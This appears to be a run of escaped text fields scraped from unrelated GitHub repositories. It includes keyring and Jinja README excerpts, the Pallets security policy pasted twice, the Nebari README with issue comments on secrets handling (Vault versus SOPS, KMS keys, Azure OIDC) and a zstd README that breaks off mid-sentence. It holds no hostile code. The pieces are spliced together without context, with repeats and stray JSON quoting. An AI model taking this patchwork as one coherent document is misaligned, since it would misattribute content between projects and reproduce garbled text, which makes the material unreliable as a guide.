TestKeyring\"\n\n        def delete_password(self, servicename, username):\n            pass\n\n    # set the keyring for keyring lib\n    keyring.set_keyring(TestKeyring())\n\n    # invoke the keyring lib\n    try:\n        keyring.set_password(\"demo-service\", \"tarek\", \"passexample\")\n        print(\"password stored successfully\")\n    except keyring.errors.PasswordSetError:\n        print(\"failed to store password\")\n    print(\"password\", keyring.get_password(\"demo-service\", \"tarek\"))\n\n\nDisabling Keyring\n=================\n\nIn many cases, uninstalling keyring will never be necessary.\nEspecially on Windows and macOS, the behavior of keyring is\nusually degenerate, meaning it will return empty values to\nthe caller, allowing the caller to fall back to some other\nbehavior.\n\nIn some cases, the default behavior of keyring is undesirable and\nit would be preferable to disable the keyring behavior altogether.\nThere are several mechanisms to disable keyring:\n\n- Uninstall keyring. Most applications are tolerant to keyring\n  not being installed. Uninstalling keyring should cause those\n  applications to fall back to the behavior without keyring.\n  This approach affects the Python environment where keyring\n  would otherwise have been installed.\n\n- Configure the Null keyring in the environment. Set\n  ``PYTHON_KEYRING_BACKEND=keyring.backends.null.Keyring``\n  in the environment, and the ``Null`` (degenerate) backend\n  will be used. This approach affects all uses of Keyring where\n  that variable is set.\n\n- Permanently configure the Null keyring for the user by running\n  ``keyring --disable`` or ``python -m keyring --disable``.\n  This approach affects all uses of keyring for that user.\n\n\nAltering Keyring Behavior\n=========================\n\nKeyring provides a mechanism to alter the keyring's behavior through\nenvironment variables. Each backend implements a\n``KeyringBackend.set_properties_from_env``, which\nwhen invoked will find all environment variables beginning with\n``KEYRING_PROPERTY_{NAME}`` and will set a property for each\n``{NAME.lower()}`` on the keyring. This method is invoked during\ninitialization for the default/configured keyring.\n\nThis mechanism may be used to set some useful values on various\nkeyrings, including:\n\n- keychain; macOS, path to an alternate keychain file\n- appid; Linux/SecretService, alternate ID for the application\n\n\nUsing Keyring on Ubuntu 16.04\n=============================\n\nThe following is a complete transcript for installing keyring in a\nvirtual environment on Ubuntu 16.04.  No config file was used::\n\n  $ sudo apt install python3-venv libdbus-glib-1-dev\n  $ cd /tmp\n  $ pyvenv py3\n  $ source py3/bin/activate\n  $ pip install -U pip\n  $ pip install secretstorage dbus-python\n  $ pip install keyring\n  $ python\n  >>> import keyring\n  >>> keyring.get_keyring()\n  <keyring.backends.SecretService.Keyring object at 0x7f9b9c971ba8>\n  >>> keyring.set_password(\"system\", \"username\", \"password\")\n  >>> keyring.get_password(\"system\", \"username\")\n  'password'\n\n\nUsing Keyring on headless Linux systems\n=======================================\n\nIt is possible to use the SecretService backend on Linux systems without\nX11 server available (only D-Bus is required). In this case:\n\n* Install the `GNOME Keyring`_ daemon.\n* Start a D-Bus session, e.g. run ``dbus-run-session -- sh`` and run\n  the following commands inside that shell.\n* Run ``gnome-keyring-daemon`` with ``--unlock`` option. The description of\n  that option says:\n\n      Read a password from stdin, and use it to unlock the login keyring\n      or create it if the login keyring does not exist.\n\n  When that command is started, enter a password into stdin and\n  press Ctrl+D (end of data). After that, the daemon will fork into\n  the background (use ``--foreground`` option to block).\n* Now you can use the SecretService backend of Keyring. Remember to\n  run your application in the same D-Bus session as the daemon.\n\n.. _GNOME Keyring: https://wiki.gnome.org/Projects/GnomeKeyring\n\nUsing Keyring on headless Linux systems in a Docker container\n=============================================================\n\nIt is possible to use keyring with the SecretService backend in Docker containers as well.\nAll you need to do is install the necessary dependencies and add the `--privileged` flag\nto avoid any `Operation not permitted` errors when attempting to unlock the system's keyring.\n\nThe following is a complete transcript for installing keyring on a Ubuntu 18:04 container::\n\n  docker run -it -d --privileged ubuntu:18.04\n\n  $ apt-get update\n  $ apt install -y gnome-keyring python3-venv python3-dev\n  $ python3 -m venv venv\n  $ source venv/bin/activate # source a virtual environment to avoid polluting your system\n  $ pip3 install --upgrade pip\n  $ pip3 install keyring\n  $ dbus-run-session -- sh # this will drop you into a new D-bus shell\n  $ echo 'somecredstorepass' | gnome-keyring-daemon --unlock # unlock the system's keyring\n\n  $ python\n  >>> import keyring\n  >>> keyring.get_keyring()\n  <keyring.backends.SecretService.Keyring object at 0x7f9b9c971ba8>\n  >>> keyring.set_password(\"system\", \"username\", \"password\")\n  >>> keyring.get_password(\"system\", \"username\")\n  'password'\n\nIntegration\n===========\n\nAPI\n---\n\nThe keyring lib has a few functions:\n\n* ``get_keyring()``: Return the currently-loaded keyring implementation.\n* ``get_password(service, username)``: Returns the password stored in the\n  active keyring. If the password does not exist, it will return None.\n* ``get_credential(service, username)``: Return a credential object stored\n  in the active keyring. This object contains at least ``username`` and\n  ``password`` attributes for the specified service, where the returned\n  ``username`` may be different from the argument.\n* ``set_password(service, username, password)``: Store the password in the\n  keyring.\n* ``delete_password(service, username)``: Delete the password stored in\n  keyring. If the password does not exist, it will raise an exception.\n\nIn all cases, the parameters (``service``, ``username``, ``password``)\nshould be Unicode text.\n\n\nExceptions\n----------\n\nThe keyring lib raises the following exceptions:\n\n* ``keyring.errors.KeyringError``: Base Error class for all exceptions in keyring lib.\n* ``keyring.errors.InitError``: Raised when the keyring cannot be initialized.\n* ``keyring.errors.PasswordSetError``: Raised when the password cannot be set in the keyring.\n* ``keyring.errors.PasswordDeleteError``: Raised when the password cannot be deleted in the keyring.\n\nGet Involved\n============\n\nPython keyring lib is an open community project and eagerly\nwelcomes contributors.\n\n* Repository: https://github.com/jaraco/keyring/\n* Bug Tracker: https://github.com/jaraco/keyring/issues/\n* Mailing list: http://groups.google.com/group/python-keyring\n\nSecurity Considerations\n=======================\n\nEach built-in backend may have security considerations to understand\nbefore using this library. Authors of tools or libraries utilizing\n``keyring`` are encouraged to consider these concerns.\n\nAs with any list of known security concerns, this list is not exhaustive.\nAdditional issues can be added as needed.\n\n- macOS Keychain\n    - Any Python script or application can access secrets created by\n      ``keyring`` from that same Python executable without the operating\n      system prompting the user for a password. To cause any specific\n      secret to prompt for a password every time it is accessed, locate\n      the credential using the ``Keychain Access`` application, and in\n      the ``Access Control`` settings, remove ``Python`` from the list\n      of allowed applications.\n\n- Freedesktop Secret Service\n    - No analysis has been performed\n\n- KDE4 & KDE5 KWallet\n    - No analysis has been performed\n\n- Windows Credential Locker\n    - No analysis has been performed\n\nMaking Releases\n===============\n\nThis project makes use of automated releases and continuous\nintegration. The\nsimple workflow is to tag a commit and push it to Github. If it\npasses tests in CI, it will be automatically deployed to PyPI.\n\nOther things to consider when making a release:\n\n- Check that the changelog is current for the intended release.\n\nRunning Tests\n=============\n\nTests are continuously run in Github Actions.\n\nTo run the tests locally, install and invoke\n`tox <https://pypi.org/project/tox>`_.\n\nBackground\n==========\n\nThe project was based on Tarek Ziade's idea in `this post`_. Kang Zhang\ninitially carried it out as a `Google Summer of Code`_ project, and Tarek\nmentored Kang on this project.\n\n.. _this post: http://tarekziade.wordpress.com/2009/03/27/pycon-hallway-session-1-a-keyring-library-for-python/\n.. _Google Summer of Code: http://socghop.appspot.com/\n\nFor Enterprise\n==============\n\nAvailable as part of the Tidelift Subscription.\n\nThis project and the maintainers of thousands of other packages are working with Tidelift to deliver one enterprise subscription that covers all of the open source you use.\n\n`Learn more <https://tidelift.com/subscription/pkg/pypi-keyring?utm_source=pypi-keyring&utm_medium=referral&utm_campaign=github>`_.\n",

See\nhttps://palletsprojects.com/security, the canonical location for the policy,\nwhich this is copied from.\n\n## Before Reporting\n\nThere are some things we generally do not consider security issues, which can be\nfound at the canonical policy page: https://palletsprojects.com/security. Please\nreview the list before reporting an issue. You may still err on the side of\ncaution and make a private report first, but we may close it or ask you to\nreport a regular issue instead.\n\n## Reporting a Security Issue\n\nIf you believe you have identified a security issue with a Pallets or\nPallets-Eco project, **do not open a public issue**. To responsibly report a\nsecurity issue, use GitHub's [security advisory system][gh-docs]. From the\nproject's repository, click \"Security\" at the top, then click \"Advisories\" at\nthe left, then click the green \"New draft security advisory\" button.\nAlternatively, you may email [security@palletsprojects.com](mailto:security@palletsprojects.com),\nand we will convert that to a GitHub security advisory.\n\nBe sure to include as much detail as necessary in your report. As with reporting\nnormal issues, a minimal reproducible example will help the maintainers address\nthe issue faster. Information about why the issue is a security issue is also\nhelpful. If you are able, you may also provide a fix for the issue.\n\nA maintainer will reply acknowledging the report and how to continue. We will\nobtain a CVE id as well, please do not do this on your own. We will work with\nyou to attempt to understand the issue and decide on its validity. Maintainers\nare volunteers working in their free time, and therefore cannot guarantee any\nspecific timeline. Please be patient during this process.\n\nThe current feature release will receive security fixes. A backport to the\nprevious feature branch may be considered upon request based on usage information\nand severity, but is not guaranteed.\n\n[gh-docs]: https://docs.github.com/en/code-security/security-advisories/working-with-repository-security-advisories/creating-a-repository-security-advisory\n",

See\nhttps://palletsprojects.com/security, the canonical location for the policy,\nwhich this is copied from.\n\n## Before Reporting\n\nThere are some things we generally do not consider security issues, which can be\nfound at the canonical policy page: https://palletsprojects.com/security. Please\nreview the list before reporting an issue. You may still err on the side of\ncaution and make a private report first, but we may close it or ask you to\nreport a regular issue instead.\n\n## Reporting a Security Issue\n\nIf you believe you have identified a security issue with a Pallets or\nPallets-Eco project, **do not open a public issue**. To responsibly report a\nsecurity issue, use GitHub's [security advisory system][gh-docs]. From the\nproject's repository, click \"Security\" at the top, then click \"Advisories\" at\nthe left, then click the green \"New draft security advisory\" button.\nAlternatively, you may email [security@palletsprojects.com](mailto:security@palletsprojects.com),\nand we will convert that to a GitHub security advisory.\n\nBe sure to include as much detail as necessary in your report. As with reporting\nnormal issues, a minimal reproducible example will help the maintainers address\nthe issue faster. Information about why the issue is a security issue is also\nhelpful. If you are able, you may also provide a fix for the issue.\n\nA maintainer will reply acknowledging the report and how to continue. We will\nobtain a CVE id as well, please do not do this on your own. We will work with\nyou to attempt to understand the issue and decide on its validity. Maintainers\nare volunteers working in their free time, and therefore cannot guarantee any\nspecific timeline. Please be patient during this process.\n\nThe current feature release will receive security fixes. A backport to the\nprevious feature branch may be considered upon request based on usage information\nand severity, but is not guaranteed.\n\n[gh-docs]: https://docs.github.com/en/code-security/security-advisories/working-with-repository-security-advisories/creating-a-repository-security-advisory\n",

Then the template is passed data to render the final document.\n\nIt includes:\n\n-   Template inheritance and inclusion.\n-   Define and import macros within templates.\n-   HTML templates can use autoescaping to prevent XSS from untrusted\n    user input.\n-   A sandboxed environment can safely render untrusted templates.\n-   AsyncIO support for generating templates and calling async\n    functions.\n-   I18N support with Babel.\n-   Templates are compiled to optimized Python code just-in-time and\n    cached, or can be compiled ahead-of-time.\n-   Exceptions point to the correct line in templates to make debugging\n    easier.\n-   Extensible filters, tests, functions, and even syntax.\n\nJinja's philosophy is that while application logic belongs in Python if\npossible, it shouldn't make the template designer's job difficult by\nrestricting functionality too much.\n\n\n## In A Nutshell\n\n```jinja\n{% extends \"base.html\" %}\n{% block title %}Members{% endblock %}\n{% block content %}\n  <ul>\n  {% for user in users %}\n    <li><a href=\"{{ user.url }}\">{{ user.username }}</a></li>\n  {% endfor %}\n  </ul>\n{% endblock %}\n```\n\n## Donate\n\nThe Pallets organization develops and supports Jinja and other popular\npackages.

From [JupyterHub](https://jupyter.org/hub \"Multi-user version of the Notebook\") to Cloud environments with\n[Dask Gateway](https://docs.dask.org/ \"Parallel computing in Python\").\n\nNebari is an open source data platform that enables users to build and maintain cost-effective and scalable compute platforms\non [HPC](#nebari-hpc) or [Kubernetes](#nebari) with minimal DevOps overhead.\n\n**This repository details the [Nebari](https://nebari.dev/ \"Official Nebari docs\") (Kubernetes) version.**\n\nNot sure what to choose? Check out our documentation on [choosing a deployment platform](https://www.nebari.dev/docs/get-started/deploy)\n\n## Nebari\n\nThe Kubernetes version of Nebari uses [Terraform](https://www.terraform.io/), [Helm](https://helm.sh/), and\n[GitHub Actions](https://docs.github.com/en/free-pro-team@latest/actions).\n\n- Terraform handles the build, change, and versioning of the infrastructure.\n- Helm helps to define, install, and manage [Kubernetes](https://kubernetes.io/ \"Automated container deployment, scaling, and management\") resources.\n- GitHub Actions is used to automatically create commits when the configuration file (`nebari-config.yaml`) is rendered,\n  as well as to kick off the deployment action.\n\nNebari aims to abstract all these complexities for its users.\nHence, it is not necessary to know any of the technologies mentioned above to have your project successfully deployed.\n\n> TLDR: If you know GitHub and feel comfortable generating and using API keys, you should have all it takes to deploy and maintain your system without the need for a dedicated\n> DevOps team. No need to learn Kubernetes, Terraform, or Helm.\n\n### Cloud Providers ☁️\n\nNebari offers out-of-the-box support for the major public cloud providers: [Digital Ocean](https://www.digitalocean.com/),\nAmazon [AWS](https://aws.amazon.com/), [GCP](https://cloud.google.com/ \"Google Cloud Provider\"), and Microsoft [Azure](https://azure.microsoft.com/en-us/).\n![High-level illustration of Nebari architecture](https://raw.githubusercontent.com/nebari-dev/nebari-docs/main/docs/static/img/welcome/nebari_overview_sequence.png)\n\n## Installation 💻\n\n### Pre-requisites\n\n- Operating System: Currently, Nebari supports development on macOS and Linux operating systems. Windows is NOT supported.\n  However, we would welcome contributions that add and improve support for Windows.\n- You need Python >= 3.10 on your local machine or virtual environment to work on Nebari.\n- Adopting virtual environments ([`conda`](https://docs.conda.io/en/latest/), [`pipenv`](https://github.com/pypa/pipenv) or\n  [`venv`](https://docs.python.org/3/library/venv.html)) is also encouraged.\n\n### Install Nebari\n\nTo install Nebari type the following commands in your command line:\n\n- Install using `conda`:\n\n  ```bash\n  conda install -c conda-forge nebari\n\n  # if you prefer using mamba\n  mamba install -c conda-forge nebari\n  ```\n\n- Install using `pip`:\n\n  ```bash\n  pip install nebari\n  ```\n\nOnce finished, you can check Nebari's version (and additional CLI arguments) by typing:\n\n```bash\nnebari --help\n```\n\nIf successful, the CLI output will be similar to the following:\n\n```bash\nusage: nebari [-h] [-v] {deploy,destroy,render,init,validate} ...\n\nNebari command line\n\npositional arguments:\n  {deploy,destroy,render,init,validate}\n                        Nebari\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -v, --version         Nebari version\n```\n\n## Usage 🚀\n\nNebari requires setting multiple environment variables to automate the deployments fully.\nFor details on obtaining those variables, check the [Nebari Get started documentation][docs-get-started].\n\nOnce all the necessary credentials are gathered and set as [UNIX environment variables](https://linuxize.com/post/how-to-set-and-list-environment-variables-in-linux/), Nebari can be\ndeployed in minutes.\n\nFor detailed step-by-step instructions on how to deploy Nebari, check the [Nebari documentation][docs-deploy].\n\n## Nebari HPC\n\nAn HPC version of Nebari is currently not available. There is one under development for Nebari's precursor QHub.\nCurious? Check out the [QHub HPC](https://github.com/Quansight/qhub-hpc) repository.\n\n## Contributing to Nebari 👩🏻‍💻\n\nThinking about contributing? Check out our [Contribution Guidelines](CONTRIBUTING.md) to get started.\n\n### Installing the Development version of Nebari ⚙️\n\nTo install the latest developer version (unstable) use:\n\n```bash\npip install git+https://github.com/nebari-dev/nebari.git\n```\n\n### Questions? 🤔\n\nHave a look at our [Frequently Asked Questions (FAQ)][nebari-faqs] to see if your query has been answered.\n\nGetting help:\n\n- [GitHub Discussions][gh-discussions] is our user forum. It can be used to raise discussions about a subject,\n    such as: \"What is the recommended way to do _X_ with Nebari?\"\n- [Issues][nebari-issues] for queries, bug reporting, feature requests, documentation, etc.\n\n> We work around the clock to make Nebari better, but sometimes your query might take a while to get a reply. We\n> apologize in advance and ask you to please, be patient :pray:.\n\n## Code of Conduct 📖\n\nTo guarantee a welcoming and friendly community, we require all community members to follow our [Code of Conduct](https://github.com/Quansight/.github/blob/master/CODE_OF_CONDUCT.md).\n\n## Ongoing Support\n\nIf you're using Nebari and would like professional support, please get in touch with the Nebari development team.\n\n## License\n\n[Nebari is BSD3 licensed](LICENSE).\n\n<!-- links -->\n[nebari-issues]: https://github.com/nebari-dev/nebari/issues\n[nebari-faqs]: https://www.nebari.dev/docs/faq\n[gh-discussions]: https://github.com/nebari-dev/nebari/discussions\n[docs-get-started]: https://www.nebari.dev/docs/get-started\n[docs-deploy]: https://www.nebari.dev/docs/get-started/deploy\n",

That would require exploration.\r\n\r\nAlso, the `S3` bucket listed above will be removed in this release as its was not being used by anything. \r\n\r\n> Also, I created this https://github.com/nebari-dev/governance/issues/55, focusing on KMS/encryption-related vulnerabilities since they could be resolved as a group with consideration of a global Nebari KMS key.\r\n\r\nExcelent, I would suggest to update the RFD with a bit more context, likely the same as your previous comment. The idea for a global key can be discussed there. In the mean time, your PR for allowing a custom KMS key entry only partially addresses this issue, so feel free to create a new one e.g [ENH] Allows users to pass custom KMS keys for AWS eks cluster encryption",

I think, your original intention with this issue was to target the use cases of the new extension and their access tokens present as env vars right? (due to them being serviced?). Though, as @Adam-D-Lewis pointed out above, we also have more general solution to the overall secret management conversation, that could be interesting as a secodna point of view. \r\n\r\nIn any case, I think (b) would've been the best approach. However, besides your appointed problem, there are many indirect dependencies in the user and system permissions within the user pod itself that other dependent services (such as conda-store or dask) could interact with, leading to possible issues later on, so I too, would like to avoid touching it if possible. \r\n\r\nI also like the first option, (a), as it seems more manageable at first glance and, at least to me, follows a mico-segmentation workflow standard. I would like to know more on what are the requirements to get into that if possible, as my perspective on this matter is heavily oriented to k8s itself. ",

This requires setting all of the following environments variables `ARM_SUBSCRIPTION_ID`, `ARM_TENANT_ID`, `ARM_CLIENT_ID`, and `ARM_CLIENT_SECRET`. \r\n\r\nWe ensure that these environment variables are included in our `nebari init` ([here](https://github.com/nebari-dev/nebari/blob/3a19b60a9556bfdfcd0efea731bfac80e479a658/nebari/utils.py#L126)) and `nebari deploy` (inherited from how the Terraform `azurerm` provider) commands.\r\n\r\nIf a user (or our integration tests) wanted to deploy Nebari using an Azure federated workflow (OIDC), they would not currently be able. \r\n\n\n### Value and/or benefit\n\nThis increases the ways in which users can deploy. This particular method is also more secure than relying on user-based cloud credentials.\n\n### Anything else?\n\nI've been attempting to get the Nebari integration tests on Azure working recently and I have run into multiple issues and decided to open this issue to document my findings. As far as I can tell, the following changes are likely needed to get this work:\r\n- Make passing `ARM_CLIENT_SECRET` optional -- the other three environment variables are still required for OIDC authentication albeit for a service principal instead for the user.\r\n- Document that `ARM_USE_OIDC=true` will be required instead.\r\n- If you want to a `remote` terraform state, this storage location of which will likely need to be passed to the provider backend for all subsequent stages, something like this\r\n\r\n```terraform\r\nterraform {\r\n  required_providers {\r\n    azurerm = {\r\n      source  = \"hashicorp/azurerm\"\r\n      version = \"=3.22.0\"\r\n    }\r\n  backend = \"azurerm\"\r\n  config = {\r\n    resource_group_name  = \"resource_group_name\"\r\n    storage_account_name = \"storage_account_name\"\r\n    container_name       = \"container_name\"\r\n    key                  = \"terraform.tfstate\"\r\n  }\r\n```",

We do have to account for the rare and currently not existing case where a user visits another service which might need the uid/gid before their first login with jupyterhub. Once they have logged in once their uid/gid is set in stone.\r\n\r\nThis feature is implemented in qhub-hpc here https://github.com/Quansight/qhub-hpc/blob/main/roles/jupyterhub/templates/jupyterhub_config.py#L68-L105. I'm not happy with this solution because it uses root username/password. Ideally we would instead make the jupyterhub oauth2 client have the role with a service account such that it can modify and read user uid/gids attributes. Completely possible with minor changes.\r\n\r\nThe uids/gids that are assigned should be as deterministic as possible e.g.`hash(username) ` and restricted within some interval and on collisions sure we increment (similar to a hashmap). We want them deterministic so that it is easier to predict the uid/gid of users/groups in the shared folders in case we mess something up.\r\n\r\nNext with the assigned uid/gids set the running securityContext for the jupyterlab pod (has been done in the past).\r\n\r\nNow here comes the problem... it is the umask this is a tricky one to set properly ... maybe we'll get it right this time but the default was that users were only able to read others files ... which seems like what the client wants here. Good! Since this is the linux default. We've struggled to get this right in the past.\r\n\r\nAdditionally we need to make the nswrapper and passwd and groups files which determine the uid -> username and gid -> groupname mapping. We will need to construct the mapping for all the usernames that share a common group with them along with the groups they are a member of.\r\n\n\n### Value and/or benefit\n\nProtected shared directories.\n\n### Anything else?\n\n_No response_",

I will have a look, thanks for the suggestion. \r\n\r\njust to extend a little the problem here:\r\n- for all cloud providers we are currently importing the necessary credentials from the env vars, and we perform a check [here](https://github.com/Quansight/qhub/blob/2687f13f54e3833234fc4282587be16521f0c84a/qhub/deploy.py#L195) during deployment, so would adopting sops to all secrets affect this as well (?)\r\n- the original reason for `QHUB_SECRETS` was the ability to pass extra information directly to Terraform wherever it was needed. Within the refactor made in v0.4.0 this might not be a good reason anymore. \r\n \r\nIts main purpose right now is just to inform qhub that there is important information to be included in the YAML that needs to be grabbed from env before propagated in the config. The original implementation has more details, so I will link [here](https://github.com/Quansight/qhub/pull/720/files)",

In this regard, the Azure Container Scan was a good option, but its timeout failure while scanning large images was a serious blocker.\r\n\r\nTo tackle this, I looked into the official Trivy action and given the fact that it is [open-source](https://github.com/aquasecurity/trivy/blob/main/LICENSE) and [fairly easy to set up](https://github.com/aquasecurity/trivy-action#usage), I have integrated it.\r\n\r\nI would love to hear what others have to say about this proposed change! \r\n",

                        "body": "## Vault status update\r\n\r\nKubernetes application pods that rely on Vault to manage their secrets can retrieve them directly via [network requests](https://learn.hashicorp.com/tutorials/vault/kubernetes-minikube) or maintained on a mounted file system through the Vault Injector service via [annotations](https://learn.hashicorp.com/tutorials/vault/kubernetes-sidecar) or attached as ephemeral volumes. This approach of employing ephemeral volumes to store secrets is a feature of the Secrets Store extension to the Kubernetes Container Storage Interface (CSI) driver.\r\n\r\n### Installing Vault:\r\n\r\nVault already provides a very customizable Helm chart for direct installation. There are two ways of providing the necessary configuration:\r\n- Using helm [configuration parameters](https://www.vaultproject.io/docs/platform/k8s/helm/configuration)\r\n- Vault also has an interesting override configuration that can be passed as well through override-values.yaml, an example of such  configuration can be seen [here](https://learn.hashicorp.com/tutorials/vault/kubernetes-raft-deployment-guide?in=vault/kubernetes#configure-vault-helm-chart)\r\n\r\n### Management of secrets:\r\n\r\nVault has two different ways of creating and managing the secrets:\r\n\r\n- [Sidecard Agent Injector](https://www.vaultproject.io/docs/platform/k8s/injector#agent-sidecar-injector)\r\n\r\nThe sidecar method requires init and/or sidecar containers to retrieve secrets. This is done either by adding pod annotations or using configuration maps defining the Vault role and the path to the secret.  It increases the total number of containers running in your cluster but provides a Vault agent to template secrets into configuration files and easily enables rotation of those secrets. \r\n\r\n- [Vault CSI provider](https://www.vaultproject.io/docs/platform/k8s/csi/installation#installing-the-vault-csi-provider)\r\n\t\r\nThe CSI method simplifies this architecture since it does not require any sidecar containers. The Vault provider is deployed as a DaemonSet and renders secrets before the pod starts. It also provides a method to sync secrets into environment variables and Kubernetes secrets. \r\nWe will need to be sure to have hostPath volumes enabled, as it`s needed to communicate with the CSI driver.\r\n\r\n### Vault authentication\r\n\r\nThe primary method of authentication with Vault when using the Vault Agent Injector or the CSI Driver is the service account attached to the pod. For Kubernetes authentication, the service account must be bound to a Vault role and a policy granting access to the secrets desired. When the pod is started it will authenticate with the Kubernetes Auth Method using the service account identity provided in your pod manifest. \r\n - It is not recommended to bind Vault roles to the default service account provided to pods if no service account is defined.\r\n\r\n### Extras\r\n- There are also other [auth methods](https://www.vaultproject.io/docs/auth#auth-methods) provided by Vault. \r\n- Vault also has a [terraform extension](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) read from, write to, and configure Vault itself.",

This server is responsible for managing and decrypting secrets. Vault is also very often configured to take advantage of some of the following features:\r\n- Authentication\r\n  - Authenticate users by outsourcing this to an identify provider such as Keycloak.\r\n- Secret Engine\r\n  - Manages static (key-value) or dynamic (ephemeral) secrets\r\n    - Dynamic keys are those that are generated when they are needed and generated for particular external application or service, reducing the amount of time these secrets are usable for. For instance, if you want to connect to a data source on AWS (regardless where you cluster is hosted), you can use the [AWS secret engine](https://developer.hashicorp.com/vault/docs/secrets/aws) which can dynamically generate credentials based on IAM roles and after a specified amount of time, these AWS keys will be automatically revoked. \r\n- Access Control List (ACL) \r\n  - Determine which users have access to which secrets.\r\n    - This solves the request raised in issue #1547.\r\n- Storage options\r\n  - The static secrets need to be stored (encrypted) somewhere, options include Consul (Hashicorp), ectd, MySQL, etc.\r\n    - It is generally best practice for these storage services to live outside of the Kubernetes cluster but it is possible to run them on the cluster as well.  \r\n- User Interface\r\n  - Vault can be enabled with a slick UI, reducing the potential pain of managing secrets from an administrator's point-of-view.\r\n    - We could add an additional link to the main Nebari nav bar \"Secret Management\".\r\n\r\n### Impressions\r\n\r\nI have to say I'm quite impressed with what I've seen so far. This is obviously a heavyweight application but makes up for it with a lot of awesome features. \r\n\r\nTo me it feels like Vault is to secret management as Keycloak is to identity and access management. \r\n\r\nThat said, this is definitely going to be a heavier lift in terms of development compared with SOPS. But, if done correctly, this will not only harden Nebari from a security perspective but it will also enable greater control over access to external data sources.",

I certainly think that vault is extremely useful but will require a lot of effort to deploy properly and most importantly will only solve the \"how to expose secrets to users\" not \"how to use secrets with a deployment\". SOPS has the opportunity to solve both and will be significantly easier to implement. I'm not saying that we never add Vault support but SOPS will be enough to solve the current issues that users have raised with us so I'm in favor of us implementing SOPS.",

While I still think Vault could be much more accessible for the user to manage (and we could try exposing the secrets using a mix of CSI drives with user-specific mounts), it will be undeniably a pain to integrate with all the Nebari inner services (more refactoring than anything else). Still, the main problem I can foresee with Vault right now is that it will become another \"Keycloak\" case where we integrate the feature, but we will not be using it to its fullest (while also taking lots of releases to make it stable).\r\n\r\nSo, I am also in favor of implementing SOPS (mainly because it has a terraform provider as well XD)",

E.g. suppose we have a config file\n\n```\na:\n  b_e:\n    - c: 1\n      d: [1, 2, 3]\n```\n\nWe would override via `QHUB__a__b_e__0__c=2`. I realize this adds several requirements. Since we already have underscores in our keys and terminals typically only allow `[A-Za-z0-9_]` we have to parse the attribute path and handle the underscores properly (we could get arround this by requiring `__` two underscores between all keys. Also we should handle list accessing by checking if the key is an integer and treat it as a list. Additionally we should attempt to cast the value as an integer since there are several integers in the config file if that fails just supply the value as a string.\n\nWe would apply all environment variables that start with `QHUB__`\n\n",

That would require exploration.\r\n\r\nAlso, the `S3` bucket listed above will be removed in this release as its was not being used by anything. \r\n\r\n> Also, I created this https://github.com/nebari-dev/governance/issues/55, focusing on KMS/encryption-related vulnerabilities since they could be resolved as a group with consideration of a global Nebari KMS key.\r\n\r\nExcelent, I would suggest to update the RFD with a bit more context, likely the same as your previous comment. The idea for a global key can be discussed there. In the mean time, your PR for allowing a custom KMS key entry only partially addresses this issue, so feel free to create a new one e.g [ENH] Allows users to pass custom KMS keys for AWS eks cluster encryption",

This is not always possible.\n\n### Value and/or benefit\n\n- Ability to confidently share example private repositories with the users with guarantee that they will not be able to clone the repository without tracking outside of the platform (`jupyterlab-gallery` use case)\r\n- Reduced risk of the LLM keys leaking (`jupyter-ai` use case)\n\n### Anything else?\n\nThis is a follow-up to https://github.com/nebari-dev/nebari/pull/2501.\r\n\r\n## Possible solutions\r\n\r\n- a) run certain server extensions in a separate container with additional secret mounts; proxy the API to the main container\r\n- b) change the file system permissions of the config files so that users cannot see them; start the single-user juypter server with elevated permissions and then drop down to the user with lower permissions (see https://github.com/nebari-dev/nebari/pull/2501#issuecomment-2168366278).\r\n\r\nI would need to explore it a bit further but while technically feasible, (b) appears not worth the trouble because changing the user identity via `SETGID` may be insecure.",

I think, your original intention with this issue was to target the use cases of the new extension and their access tokens present as env vars right? (due to them being serviced?). Though, as @Adam-D-Lewis pointed out above, we also have more general solution to the overall secret management conversation, that could be interesting as a secodna point of view. \r\n\r\nIn any case, I think (b) would've been the best approach. However, besides your appointed problem, there are many indirect dependencies in the user and system permissions within the user pod itself that other dependent services (such as conda-store or dask) could interact with, leading to possible issues later on, so I too, would like to avoid touching it if possible. \r\n\r\nI also like the first option, (a), as it seems more manageable at first glance and, at least to me, follows a mico-segmentation workflow standard. I would like to know more on what are the requirements to get into that if possible, as my perspective on this matter is heavily oriented to k8s itself. ",

The downside is that it will be a tad harder to debug when things go wrong - if someone was to remove this rule, the extension would appear to be partially working because it would be hitting the endpoint in the main container (although it would not be getting any config).",

Small data comes with different perspectives.\n\nThe smaller the amount of data to compress, the more difficult it is to compress. This problem is common to all compression algorithms, and reason is, compression algorithms learn from past data how to compress future data. But at the beginning of a new data set, there is no \"past\" to build upon.\n\nTo solve this situation, Zstd offers a __training mode__, which can be used to tune the algorithm for a selected type of data.\nTraining Zstandard is achieved by providing it with a few samples (one file per sample). The result of this training is stored in a file called \"dictionary\", which must be loaded before compression and decompression.\nUsing this dictionary, the compression ratio achievable on small data improves dramatically.\n\nThe following example uses the `github-users` [sample set](https://github.com/facebook/zstd/releases/tag/v1.1.3), created from [github public API](https://developer.github.com/v3/users/#get-all-users).\nIt consists of roughly 10K records weighing about 1KB each.\n\nCompression Ratio | Compression Speed | Decompression Speed\n------------------|-------------------|--------------------\n![Compression Ratio](doc/images/dict-cr.png \"Compression Ratio\") | ![Compression Speed](doc/images/dict-cs.png \"Compression Speed\") | ![Decompression Speed](doc/images/dict-ds.png \"Decompression Speed\")\n\n\nThese compression gains are achieved while simultaneously providing _faster_ compression and decompression speeds.\n\nTraining works if there is some correlation in a family of small data samples. The more data-specific a dictionary is, the more efficient it is (there is no _universal dictionary_).\nHence, deploying one dictionary per type of data will provide the greatest benefits.\nDictionary gains are mostly effective in the first few KB. Then, the compression algorithm will gradually use previously decoded content to better compress the rest of the file.\n\n### Dictionary compression How To:\n\n1. Create the dictionary\n\n   `zstd --train FullPathToTrainingSet/* -o dictionaryName`\n\n2. Compress with dictionary\n\n   `zstd -D dictionaryName FILE`\n\n3. Decompress with dictionary\n\n   `zstd -D dictionaryName --decompress FILE.zst`\n\n\n## Build instructions\n\n`make` is the officially maintained build system of this project.\nAll other build systems are \"compatible\" and 3rd-party maintained,\nthey may feature small differences in advanced options.\nWhen your system allows it, prefer using `make` to build `zstd` and `libzstd`.\n\n### Makefile\n\nIf your system is compatible with standard `make` (or `gmake`),\ninvoking `make` in root directory will generate `zstd` cli in root directory.\nIt will also create `libzstd` into `lib/`.\n\nOther available options include:\n- `make install` : create and install zstd cli, library and man pages\n- `make check` : create and run `zstd`, test its behavior on local platform\n\nThe `Makefile` follows the [GNU Standard Makefile 